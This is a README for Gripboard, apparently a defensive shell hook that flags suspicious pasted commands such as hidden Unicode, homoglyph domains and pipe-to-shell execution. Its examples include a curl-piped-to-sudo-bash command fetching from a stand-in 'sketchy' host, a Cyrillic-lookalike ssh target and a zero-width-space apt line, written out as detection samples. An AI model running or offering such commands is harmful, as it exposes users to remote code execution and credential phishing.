# Gripboard

**Stop malicious commands before they run.**

Every day, developers and sysadmins copy commands from Stack Overflow, GitHub issues, blog posts, and AI chatbots. Attackers exploit this habit by hiding dangerous payloads inside innocent-looking code — invisible Unicode characters, lookalike letters that redirect connections to attacker-controlled servers, and obfuscated shell commands that open backdoors on your machine.

By the time you notice, it's too late. The command already ran.

Gripboard hooks into your shell and **blocks suspicious commands at Enter-press time** — before they execute. If something looks wrong, you'll see exactly what was detected and must explicitly confirm before the command runs.

## What it catches

- **Invisible characters** — zero-width spaces, soft hyphens, and other hidden Unicode that alter what a command actually does
- **Homoglyph attacks** — Cyrillic `о` disguised as Latin `o`, redirecting `ssh admin@google.com` to an attacker's server
- **Bidirectional text exploits** — Right-to-Left overrides that make code appear different than it executes (Trojan Source)
- **Dangerous shell patterns** — `curl | sh`, reverse shells, recursive deletion, privilege escalation, encoded payloads
- **Obfuscated commands** — base64-encoded payloads, hex-escaped strings, and other evasion techniques

## Install

### 1. System dependencies

```bash
# Arch/Manjaro
sudo pacman -S xclip wl-clipboard

# Debian/Ubuntu
sudo apt install xclip wl-clipboard

# Fedora
sudo dnf install xclip wl-clipboard
```

You only need the clipboard tool for your display server — `xclip` for X11 or `wl-clipboard` for Wayland.

### 2. Gripboard

```bash
git clone https://github.com/flyawayfpv/gripboard.git
cd gripboard
python -m venv --system-site-packages .venv
source .venv/bin/activate
pip install -e .
```

### 3. Activate

```bash
gripboard install
```

This adds a shell hook to your `.zshrc`, `.bashrc`, or `config.fish`. Open a new terminal and you're protected.

## How it works

When you press Enter, Gripboard scans the command before your shell executes it:

- **Clean** — the command runs immediately, no delay, no output
- **Flagged** — you see what was detected and a prompt:

```
[GRIPBOARD CRITICAL] Suspicious content detected!
  Findings (1):
    [CRITICAL] rule:pipe-to-shell - Pipe-to-shell execution
  Risk Score: 75/100 (CRITICAL)

[GRIPBOARD] Execute anyway? [y/N]
```

Press `N` (or just Enter) to block it. Press `y` only if you're sure.

## Examples

A tutorial tells you to run:
```bash
curl https://some-sketchy-site.com/install.sh | sudo bash
```
**Blocked.** Gripboard flags pipe-to-shell execution as critical.

A phishing page hides Cyrillic characters in a domain:
```bash
ssh admin@gооgle.com    # Those 'o's are Cyrillic U+043E
```
**Blocked.** Gripboard detects the homoglyphs and shows the real characters.

Malicious code uses invisible Unicode to disguise what it does:
```bash
sudo apt update && sudo apt​ upgrade   # Hidden zero-width space
```
**Blocked.** Gripboard finds the invisible character and shows its exact position.

## Uninstall

```bash
gripboard uninstall
```

Removes the shell hook and cleans up. Your shell rc file is restored.

## License

MIT
